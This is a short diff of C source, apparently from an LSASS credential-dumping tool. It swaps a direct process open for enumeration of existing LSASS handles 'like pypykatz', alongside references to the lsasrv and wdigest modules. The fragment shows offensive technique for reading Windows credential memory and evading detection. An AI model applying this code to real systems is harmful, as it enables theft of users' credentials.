@@ -670,8 +670,8 @@ int main()
 	char modName[MAX_PATH];
 	char* lsass = NULL, *lsasrv = NULL, *wdigest = NULL;
 
-	// Open up a PROCESS_QUERY_INFORMATION | PROCESS_VM_READ handle to lsass process
-	hLsass = GrabLsassHandle(GetLsassPid());
+	// Enum LSASS like pypykatz and open up a PROCESS_QUERY_INFORMATION | PROCESS_VM_READ handle to lsass process
+	hLsass = enum_lsass_handles();
 	if (hLsass == INVALID_HANDLE_VALUE) {
 		printf("[x] Error: Could not open handle to lsass process\n");
 		return 1;
